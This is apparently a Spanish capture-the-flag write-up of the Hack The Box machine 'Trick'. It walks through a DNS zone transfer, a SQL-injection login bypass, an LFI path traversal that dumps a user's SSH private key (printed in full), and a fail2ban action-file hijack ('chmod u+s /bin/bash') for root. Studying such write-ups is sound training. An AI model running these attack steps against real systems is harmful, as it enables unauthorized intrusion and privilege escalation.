# Resolución maquina Trick

**Autor:** PepeMaquina  
**Fecha:** 02 de diciembre de 2025  
**Dificultad:** Easy.
**Sistema Operativo:** Linux  
**Tags:** DNS, LFI, Fail2Ban.

---
## Imagen de la Máquina

![](trick.jpg)

*Imagen: Trick.JPG*
## Reconocimiento Inicial
### Escaneo de Puertos
Comenzamos con un escaneo completo de nmap para identificar servicios expuestos:
~~~ bash
sudo nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.129.227.180 -oG networked
~~~
Luego queda realizar un escaneo detallado de puertos abiertos:
~~~ bash
sudo nmap -sCV -p22,25,53,80 10.129.227.180 -oN targeted
~~~
### Enumeración de Servicios
~~~ 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~
### Aprovechando la transferencia de zonas
No es muy comun ver un puerto 53 dentro de un servidor linux, pero siempre que se pueda ver el servicio abierto se podria ver el dominio al que pertenece.
~~~bash
┌──(kali㉿kali)-[~/htb/trick/nmap]
└─$ dig @10.129.227.180 -x 10.129.227.180

; <<>> DiG 9.20.7-1-Debian <<>> @10.129.227.180 -x 10.129.227.180
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 48554
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 2c6354bb44a0933bc65b272c695805fcf71208f6df5475bf (good)
;; QUESTION SECTION:
;180.227.129.10.in-addr.arpa.   IN      PTR

;; ANSWER SECTION:
180.227.129.10.in-addr.arpa. 604800 IN  PTR     trick.htb.

;; AUTHORITY SECTION:
227.129.10.in-addr.arpa. 604800 IN      NS      trick.htb.

;; ADDITIONAL SECTION:
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1

;; Query time: 147 msec
;; SERVER: 10.129.227.180#53(10.129.227.180) (UDP)
;; WHEN: Fri Jan 02 12:53:02 EST 2026
;; MSG SIZE  rcvd: 165
~~~
Con esto se puede ver que tiene el dominio como "trick.htb", aprovechando esto se realiza una transferencia de zonas para poder ver posibles subdominios que se puedan encontrar.
~~~bash
┌──(kali㉿kali)-[~/htb/trick/nmap]
└─$ dig axfr trick.htb @10.129.227.180

; <<>> DiG 9.20.7-1-Debian <<>> axfr trick.htb @10.129.227.180
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 143 msec
;; SERVER: 10.129.227.180#53(10.129.227.180) (TCP)
;; WHEN: Fri Jan 02 12:59:43 EST 2026
;; XFR size: 6 records (messages 1, bytes 231)
~~~
Bingo!!! Se puede ver que tiene un subdominio, asi que se agrega todo en el "etc/hosts".
~~~bash
┌──(kali㉿kali)-[~/htb/trick/nmap]
└─$ cat /etc/hosts | grep 10.129.227
10.129.227.180 trick.htb preprod-payroll.trick.htb
~~~

### Enumeración dentro de la pagina web
Primero se realiza la enumeracion del dominio principal.

![](trick2.jpg)

Al parecer el sitio permite el registro de emails para notificar sobre posibles actualizaciones. Tras enviar esto a burpsuite no se pudo encontrar algo util por lo que no se puede hacer casi nada al respecto.

Pasando al subdominio se puede ver un inicio de sesion.

![](trick3.jpg)

Probando posibles credenciales por defecto esto no surge efecto, asi que se intenta el tipico bypass sqli.
~~~sql
' or 1=1-- -
~~~
Esto si dio lugar a poder entrar como el usuario administrator, parece que es un dashboard sobre listas de empleados y varias cosas referentes a la empresa.
A primera vista parece ocupar una base de datos y posiblemente exista algun sqli en algun lado para poder ver credenciales y/o información.

Tras revisar casi todos los campos, la unica forma de encontrar un sqli es en el mismo inicio de sesion.
Para agilizar el proceso se lo envie a "sqlmap" en segundo plano.

Mientras al ver el codigo fuente de la pagina, en el nombre del titulo se tiene un mensaje "Admin | Employees Payroll Management System".
~~~html
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title>Admin | Employee's Payroll Management System</title>
 	
<meta content="" name="descriptison">
  <meta content="" name="keywords">
...............
<SNIP>
...............
~~~
Esto ya va de la mano de un analisis un poco profundo, pero el titulo menciona el sistema "payroll" y recordando el nombre del subdominio es "preprod-payroll.trick.htb" lo que normalmente viene a ser una pagina en preproduccion, asi que pensando un poco, normalmente los desarrolladores puede colocar mas subdominios como "preprod-dev" o "preprod-newFunction" asi que puede ser buena idea fuzzear ese parametro.
~~~bash
┌──(kali㉿kali)-[~/htb/trick/nmap]
└─$ wfuzz -u http://10.129.227.180 -H "Host:preprod-FUZZ.trick.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hl 83
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.227.180/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                    
=====================================================================

000000668:   200        178 L    631 W      9660 Ch     "marketing"                                                                                
000005905:   302        266 L    527 W      9546 Ch     "payroll"                                                                                  
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 678.1058
Processed Requests: 43740
Filtered Requests: 43738
Requests/sec.: 64.50320
~~~
Por suerte se encontro otro subdominio llamado "preprod-marketing", esto se agrega al "etc/hosts"
~~~bash
┌──(kali㉿kali)-[~/htb/trick/nmap]
└─$ cat /etc/hosts | grep 10.129.227
10.129.227.180 trick.htb preprod-payroll.trick.htb preprod-marketing.trick.htb
~~~

Inspeccionando el nuevo subdominio se ve una pagina simple.

![](trick4.jpg)

Pero viendolo bien, se puede ver que la pagina principal "index.php" llama a otra con el parametro "page", esto es una posible inyeccion LFI.
Probando varias inyecciones, se descubre una que surge efecto y se puede ver el archivo passwd.

![](trick5.jpg)

Con un LFI a la mano, lo primero que hago es ver las variables de entorno, pero por alguna razon esto se queda en blanco, asi que antes que nada se prueba con una lista de posibles archivos donde que puede encontrar informacion. (https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Linux)
```bash
┌──(kali㉿kali)-[~/htb/trick/exploits]
└─$ ffuf -w ./LFI-Wordlist-Linux -u 'http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//FUZZ' -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//FUZZ
 :: Wordlist         : FUZZ: /home/kali/htb/trick/exploits/LFI-Wordlist-Linux
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

/etc/adduser.conf       [Status: 200, Size: 2981, Words: 398, Lines: 86, Duration: 162ms]
/etc/bluetooth/main.conf [Status: 200, Size: 4491, Words: 620, Lines: 109, Duration: 145ms]
/etc/crontab            [Status: 200, Size: 1042, Words: 181, Lines: 23, Duration: 145ms]
/etc/bluetooth/network.conf [Status: 200, Size: 120, Words: 11, Lines: 7, Duration: 147ms]
/etc/ca-certificates.conf [Status: 200, Size: 5989, Words: 64, Lines: 149, Duration: 149ms]
/etc/avahi/avahi-daemon.conf [Status: 200, Size: 1753, Words: 130, Lines: 69, Duration: 151ms]
/etc/bash.bashrc        [Status: 200, Size: 1994, Words: 339, Lines: 59, Duration: 154ms]
/etc/bluetooth/input.conf [Status: 200, Size: 927, Words: 121, Lines: 27, Duration: 154ms]
/etc/cups/cupsd.conf    [Status: 200, Size: 6402, Words: 785, Lines: 187, Duration: 155ms]
/etc/default/grub       [Status: 200, Size: 1203, Words: 142, Lines: 33, Duration: 157ms]
/etc/deluser.conf       [Status: 200, Size: 604, Words: 86, Lines: 21, Duration: 158ms]
/etc/dhcp/dhclient.conf [Status: 200, Size: 775, Words: 101, Lines: 21, Duration: 158ms]
/etc/debconf.conf       [Status: 200, Size: 2969, Words: 411, Lines: 84, Duration: 158ms]
/etc/debian_version     [Status: 200, Size: 6, Words: 1, Lines: 2, Duration: 160ms]
/etc/fstab              [Status: 200, Size: 632, Words: 162, Lines: 13, Duration: 149ms]
/etc/group-             [Status: 200, Size: 1013, Words: 1, Lines: 72, Duration: 146ms]
/etc/fuse.conf          [Status: 200, Size: 280, Words: 38, Lines: 9, Duration: 148ms]
/etc/hdparm.conf        [Status: 200, Size: 5060, Words: 757, Lines: 143, Duration: 146ms]
/etc/hostname           [Status: 200, Size: 6, Words: 1, Lines: 2, Duration: 146ms]
/etc/host.conf          [Status: 200, Size: 9, Words: 2, Lines: 2, Duration: 146ms]
/etc/hosts.deny         [Status: 200, Size: 711, Words: 128, Lines: 18, Duration: 145ms]
/etc/hosts.allow        [Status: 200, Size: 411, Words: 82, Lines: 11, Duration: 148ms]
/etc/issue              [Status: 200, Size: 27, Words: 5, Lines: 3, Duration: 144ms]
/etc/ld.so.conf         [Status: 200, Size: 34, Words: 2, Lines: 3, Duration: 145ms]
/etc/ldap/ldap.conf     [Status: 200, Size: 332, Words: 23, Lines: 18, Duration: 145ms]
/etc/kernel-img.conf    [Status: 200, Size: 144, Words: 17, Lines: 7, Duration: 151ms]
/etc/logrotate.conf     [Status: 200, Size: 435, Words: 61, Lines: 21, Duration: 152ms]
/etc/login.defs         [Status: 200, Size: 10477, Words: 1619, Lines: 341, Duration: 152ms]
/etc/issue.net          [Status: 200, Size: 20, Words: 3, Lines: 2, Duration: 151ms]
/etc/manpath.config     [Status: 200, Size: 5174, Words: 530, Lines: 132, Duration: 146ms]
/etc/modules            [Status: 200, Size: 195, Words: 33, Lines: 6, Duration: 149ms]
/etc/motd               [Status: 200, Size: 286, Words: 36, Lines: 8, Duration: 148ms]
/etc/mtab               [Status: 200, Size: 2321, Words: 156, Lines: 32, Duration: 146ms]
/etc/pam.conf           [Status: 200, Size: 552, Words: 65, Lines: 16, Duration: 146ms]
/etc/networks           [Status: 200, Size: 60, Words: 1, Lines: 5, Duration: 147ms]
/etc/mysql/my.cnf       [Status: 200, Size: 869, Words: 115, Lines: 24, Duration: 147ms]
/etc/nginx/nginx.conf   [Status: 200, Size: 1482, Words: 116, Lines: 86, Duration: 148ms]
/etc/os-release         [Status: 200, Size: 261, Words: 6, Lines: 10, Duration: 152ms]
/etc/passwd             [Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 151ms]
/etc/passwd-            [Status: 200, Size: 2397, Words: 28, Lines: 43, Duration: 151ms]
/etc/profile            [Status: 200, Size: 767, Words: 157, Lines: 35, Duration: 141ms]
/etc/group              [Status: 200, Size: 958, Words: 1, Lines: 71, Duration: 584ms]
/etc/hosts              [Status: 200, Size: 36, Words: 3, Lines: 3, Duration: 583ms]
/etc/pulse/client.conf  [Status: 200, Size: 1201, Words: 170, Lines: 36, Duration: 142ms]
/etc/resolv.conf        [Status: 200, Size: 38, Words: 3, Lines: 3, Duration: 146ms]
/etc/security/group.conf [Status: 200, Size: 3635, Words: 690, Lines: 107, Duration: 142ms]
/etc/security/access.conf [Status: 200, Size: 4564, Words: 635, Lines: 123, Duration: 142ms]
/etc/security/limits.conf [Status: 200, Size: 2161, Words: 747, Lines: 57, Duration: 142ms]
/etc/security/namespace.conf [Status: 200, Size: 1440, Words: 219, Lines: 29, Duration: 143ms]
/etc/security/pam_env.conf [Status: 200, Size: 2972, Words: 429, Lines: 74, Duration: 142ms]
/etc/security/sepermit.conf [Status: 200, Size: 419, Words: 106, Lines: 12, Duration: 143ms]
/etc/security/time.conf [Status: 200, Size: 2179, Words: 342, Lines: 66, Duration: 144ms]
/etc/sensors3.conf      [Status: 200, Size: 10593, Words: 2648, Lines: 537, Duration: 145ms]
/etc/ssh/sshd_config    [Status: 200, Size: 3235, Words: 293, Lines: 122, Duration: 143ms]
/etc/sysctl.conf        [Status: 200, Size: 2351, Words: 250, Lines: 69, Duration: 142ms]
/etc/timezone           [Status: 200, Size: 12, Words: 1, Lines: 2, Duration: 144ms]
/proc/meminfo           [Status: 200, Size: 1335, Words: 462, Lines: 49, Duration: 146ms]
/proc/cpuinfo           [Status: 200, Size: 2278, Words: 283, Lines: 57, Duration: 147ms]
/proc/net/udp           [Status: 200, Size: 1152, Words: 296, Lines: 10, Duration: 144ms]
/proc/self/cmdline      [Status: 200, Size: 78, Words: 3, Lines: 1, Duration: 145ms]
/proc/net/tcp           [Status: 200, Size: 33450, Words: 12486, Lines: 224, Duration: 145ms]
/proc/self/mounts       [Status: 200, Size: 2321, Words: 156, Lines: 32, Duration: 142ms]
/proc/self/stat         [Status: 200, Size: 312, Words: 52, Lines: 2, Duration: 145ms]
/proc/self/status       [Status: 200, Size: 1086, Words: 91, Lines: 55, Duration: 142ms]
/proc/version           [Status: 200, Size: 138, Words: 14, Lines: 2, Duration: 142ms]
/proc/devices           [Status: 200, Size: 447, Words: 82, Lines: 51, Duration: 512ms]
/usr/share/adduser/adduser.conf [Status: 200, Size: 2981, Words: 398, Lines: 86, Duration: 151ms]
/var/log/nginx/error.log [Status: 200, Size: 902243, Words: 72385, Lines: 1250, Duration: 173ms]
/var/log/nginx/access.log [Status: 200, Size: 63143175, Words: 6522596, Lines: 592372, Duration: 448ms]
:: Progress: [771/771] :: Job [1/1] :: 23 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```
Con esta lista se me ocurren varios ataques, enumerando ellos.
- Dependiendo del usuario que hostea, se puede sacar su id_rsa
- Se tiene el archivo "access.log" y se puede hacer un log poison.
- Se tiene abierto el puerto 25 (SMTP), con ello se puede hacer un mail poison.

### Extrayendo id_rsa
Como pentester, mi camino casi siempre sera intentar lo mas sencillo, en este caso seria obtener el id_rsa, para ello viendo el archivo "/etc/passwd" pude notar que existen los usuarios root u michael como usuarios con una shell, pero para asegurarme de quien esta hosteando el servicio voy al archivo que veo abierto "/proc/self/cmdline"

![](trick6.jpg)

Con esto veo que el usuario que hostea el servidor es michael, pero para asegurarme mas aun veo el archivo "/etc/nginx/sites-enabled/default"

![](trick7.jpg)

Con esto es mas que seguro que el usuario michael es el que hostea el servicio, asi que se intenta ver su id_rsa.
~~~bash
┌──(kali㉿kali)-[~/htb/trick/nmap]
└─$ curl http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//home/michael/.ssh/id_rsa       
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
~~~
Por suerte si existe el id_rsa, por lo que se ya se podria obtener acceso por ssh.
~~~bash
┌──(kali㉿kali)-[~/htb/trick/content]
└─$ nano id_rsa_michael
                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/trick/content]
└─$ chmod 600 id_rsa_michael 

┌──(kali㉿kali)-[~/htb/trick/content]
└─$ ssh -i id_rsa_michael michael@10.129.227.180 
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
michael@trick:~$
~~~
***NOTA: Al intentar el acceso por log poison no surgio efecto porque misteriosamente el archivo access.log desaparecio, al igual que main poison, posiblemente sean problemas de la maquina pero no tuve mucho tiempo como para volver a probarlo***

---
## User Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

### User Flag
Con acceso al servidor, solo queda buscar la user flag.
~~~
michael@trick:~$ cat user.txt
<Encuentre su propia usre flag>
~~~

---
## Escalada de Privilegios
Para la escalada de privilegios, simplemente se realiza la enumeración básica de permisos con sudo, con esto se pudo ver que se puede ejecutar un comando con un binario que podria ser bueno para explotar.
~~~bash
michael@trick:/etc/fail2ban/action.d$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
~~~
Se ve que existe "fail2ban" que es un servicio para banear ips siempre y cuando hayan realizado varios intentos de sesion fallidos, es bastante bueno para evitar ataques de fuerza bruta.

### Aprovechando FAIL2BAN
Lo mas facil en este caso es modificar el archivo "iptables-multiport.conf" (para versiones inferiores a 1.0.1) o "iptables.conf" para versiones superiores a 1.0.1, modificar todo con un payload que puede ser una reverse o lo que sea para que cuando un usuario intente loguearse varias veces con credenciales incorrectas entonces ejecute el comando pero con permisos root.
Finalmente se reinicia el servicio y todo queda resuelto. Se puede encontrar mas informacion en este articulo (https://juggernaut-sec.com/fail2ban-lpe/).

Probando esto, primero cree un archivo "iptables-multiport.conf" en una carpeta con permisos:
~~~bash
michael@trick:/etc/fail2ban/action.d$ cat /tmp/iptables-multiport.conf 
# Fail2Ban configuration file
#
# Author: Cyril Jaquier
# Modified by Yaroslav Halchenko for multiport banning
#

[INCLUDES]

before = iptables-common.conf

[Definition]

# Option:  actionstart
# Notes.:  command executed once at the start of Fail2Ban.
# Values:  CMD
#
actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

# Option:  actionstop
# Notes.:  command executed once at the end of Fail2Ban
# Values:  CMD
#
actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

# Option:  actioncheck
# Notes.:  command executed once before each actionban command
# Values:  CMD
#
actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = chmod u+s /bin/bash

# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>

[Init]
~~~
La linea que es importante modificar es:
~~~
actionban = chmod u+s /bin/bash
~~~
Esto se hizo porque no se tiene permiso directo de modificar el archivo original ya que esta creado por root.
~~~bash
michael@trick:/etc/fail2ban/action.d$ ls -la /etc/fail2ban/action.d/iptables-multiport.conf 

-rw-r--r-- 1 root root 1420 Jan  3 04:51 /etc/fail2ban/action.d/iptables-multiport.conf
~~~
Pero si se tiene permisos sobre la carpeta "action.d"
~~~bash
michael@trick:/etc/fail2ban/action.d$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)

michael@trick:/etc/fail2ban/action.d$ ls -la /etc/fail2ban/
total 76
drwxr-xr-x   6 root root      4096 Jan  3 04:51 .
drwxr-xr-x 126 root root     12288 Jan  3 04:51 ..
drwxrwx---   2 root security  4096 Jan  3 04:51 action.d
-rw-r--r--   1 root root      2334 Jan  3 04:51 fail2ban.conf
drwxr-xr-x   2 root root      4096 Jan  3 04:51 fail2ban.d
drwxr-xr-x   3 root root      4096 Jan  3 04:51 filter.d
-rw-r--r--   1 root root     22908 Jan  3 04:51 jail.conf
drwxr-xr-x   2 root root      4096 Jan  3 04:51 jail.d
-rw-r--r--   1 root root       645 Jan  3 04:51 paths-arch.conf
-rw-r--r--   1 root root      2827 Jan  3 04:51 paths-common.conf
-rw-r--r--   1 root root       573 Jan  3 04:51 paths-debian.conf
-rw-r--r--   1 root root       738 Jan  3 04:51 paths-opensuse.conf
~~~
Por ello se puede borrar el archivo original y copiar el nuevo que se creo.
~~~bash
michael@trick:/etc/fail2ban/action.d$ rm iptables-multiport.conf 
rm: remove write-protected regular file 'iptables-multiport.conf'? y
michael@trick:/etc/fail2ban/action.d$ cp /tmp/iptables-multiport.conf .
~~~
Finalmente se reinicia el servicio.
~~~bash
michael@trick:/etc/fail2ban/action.d$ sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
~~~
Con ello todo queda configurado, ahora se debe de intentar loguear al menos 5 veces con credenciales incorrectas para que el payload surja efecto.

***NOTA: Intente hacerlo con varias herramientas como netexec, hydra, etc, pero ninguna dio resultado, solamente se pudo con "crackmapexec"***

~~~bash
┌──(kali㉿kali)-[~/htb/trick/exploits]
└─$ crackmapexec ssh 10.129.227.180 -u root -p /usr/share/wordlists/rockyou.txt
SSH         10.129.227.180  22     10.129.227.180   [*] SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
SSH         10.129.227.180  22     10.129.227.180   [-] root:123456 Authentication failed.
SSH         10.129.227.180  22     10.129.227.180   [-] root:12345 Authentication failed.
SSH         10.129.227.180  22     10.129.227.180   [-] root:123456789 Authentication failed.
SSH         10.129.227.180  22     10.129.227.180   [-] root:password Authentication failed.
SSH         10.129.227.180  22     10.129.227.180   [-] root:iloveyou Authentication failed.
SSH         10.129.227.180  22     10.129.227.180   [-] root:princess Authentication failed.
SSH         10.129.227.180  22     10.129.227.180   [-] root:1234567 Authentication failed.
SSH         10.129.227.180  22     10.129.227.180   [-] root:rockyou Authentication failed.
SSH         10.129.227.180  22     10.129.227.180   [-] root:12345678 Authentication failed.
SSH         10.129.227.180  22     10.129.227.180   [-] root:abc123 Authentication failed.
~~~
Ahora revisando los permisos a la bash.
~~~bash
michael@trick:/etc/fail2ban/action.d$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
~~~
Ya se tienen permisos SUID.

---
## Root Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

Con la bash con permisos SUID, se puede ingresar como root y ver la root flag.
~~~bash
michael@trick:/etc/fail2ban/action.d$ /bin/bash -p
bash-5.0# cat /root/root.txt
<Encuentre su propia root flag>
~~~
De esa forma, se logro obtener la root flag.
🎉 Sistema completamente comprometido - Root obtenido

